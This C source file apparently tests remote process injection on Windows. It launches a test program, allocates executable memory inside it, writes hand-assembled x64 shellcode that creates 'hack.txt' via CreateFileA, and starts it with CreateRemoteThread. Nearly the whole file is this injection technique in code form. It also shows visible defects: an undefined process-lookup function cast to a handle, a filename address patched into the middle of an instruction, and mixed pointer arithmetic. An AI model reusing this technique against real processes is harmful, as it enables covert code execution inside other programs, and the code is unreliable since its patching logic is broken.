#include <windows.h>

int main() {
    system("start /B memoryTestApp.exe");
    HANDLE process = NULL;
    while (process == NULL) {
        process = (HANDLE)getProcessByName("memoryTestApp.exe");
    }
    
    
	PVOID pRemoteBuffer;
	pRemoteBuffer = VirtualAllocEx(process, NULL, 4096, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	if (!pRemoteBuffer) {
        printf("injectShellcode()::VirtualAllocEx() failed: %d", GetLastError());
	}


    FARPROC addrCreateFileA = GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "CreateFileA");
    if (addrCreateFileA == NULL) {
        printf("injectShellcodeTest() failed. GetProcAddress returned NULL\n");
        goto Exit;
    }
    void* rwMemory = VirtualAlloc(NULL, 4096, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (rwMemory == NULL) {
        printf("injectShellcodeTest() failed. Virtual Alloc returned NULL\n");
        goto Exit;
    }
    DWORD offset = 0;
    BYTE injectBytes[] = {
        0x48, 0x83, 0xEC, 0x48,                                     // sub     rsp, 48h
        0x48, 0xC7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00,       // mov     [rsp+48h+hTemplateFile], 0 ; hTemplateFile
        0xC7, 0x44, 0x24, 0x28, 0x80, 0x00, 0x00, 0x00,             // mov     [rsp+48h+dwFlagsAndAttributes], 80h ; dwFlagsAndAttributes
        0xC7, 0x44, 0x24, 0x20, 0x01, 0x00, 0x00, 0x00,             // mov     [rsp+48h+dwCreationDisposition], 1 ; dwCreationDisposition
        0x45, 0x33, 0xC9,                                           // xor     r9d, r9d        ; lpSecurityAttributes (31)
        0x45, 0x33, 0xC0,                                           // xor     r8d, r8d        ; dwShareMode (34)
        0xBA, 0x00, 0x00, 0x00, 0x40,                               // mov     edx, 40000000h  ; dwDesiredAccess (39)
        0x48, 0x8D, 0x0D, 0xD1, 0x3F, 0x01, 0x00,                   // lea     rcx, FileName   ; "hack.txt" (46)
        0x48, 0xA1, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov     rax, CreateFileAAdress
        //0xFF, 0x15, 0xCB, 0xAF, 0x00, 0x00,                       // call    cs:CreateFileA 
        // 0xFF, 0x02,                                              // call rax
        0xFF, 0xD0,                                                 // call rax
        0x33, 0xC0,                                                 // xor     eax, eax
        0x48, 0x83, 0xC4, 0x48,                                     // add     rsp, 48h
        0xC3                                                        // retn

    };
    // *(DWORD*)(injectBytes + 25) = (DWORD)addrCreateFileA;
    *(DWORD64*)((PUCHAR)injectBytes + 49) = (DWORD64)(ULONG_PTR)addrCreateFileA;
    CopyMemory(((DWORD*)rwMemory + offset), injectBytes, sizeof(injectBytes));
    offset += sizeof(injectBytes);


    // UCHAR x64InfiniteLoop[] = { 0xEB, 0xFE }; // nop + jmp rel8 -2
	// CopyMemory((void*)addrEndOfShellCode, x64InfiniteLoop, sizeof(x64InfiniteLoop));
    // addrEndOfShellCode += sizeof(x64InfiniteLoop);
    
    
 
	const char nameBuf[] = "hack.txt";
	CopyMemory((void*)((DWORD64)rwMemory + offset), nameBuf, strlen(nameBuf));
    offset += strlen(nameBuf);
    
    DWORD64 lpNameInRemoteExecMemory = (DWORD64)pRemoteBuffer + offset - strlen(nameBuf);
	CopyMemory((void*)((DWORD64)rwMemory + 42), &lpNameInRemoteExecMemory, sizeof(lpNameInRemoteExecMemory));

    printf("%d, %d\n", strlen(nameBuf), sizeof(nameBuf));
    
	if (!WriteProcessMemory(process, pRemoteBuffer, rwMemory, 4096, NULL)) {
        printf("injectShellcode()::WriteProcessMemory() failed: %d", GetLastError());
    }
    
    HANDLE hRemoteThread;
    // todo: add shellcode execution
	hRemoteThread = CreateRemoteThread(process, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteBuffer, NULL, 0, NULL);
	if (!hRemoteThread) {
        printf("injectShellcode()::CreateRemoteThread() failed: %d", GetLastError());
	}
    

    Exit:
    system("taskkill /IM memoryTestApp.exe /F >nul");
}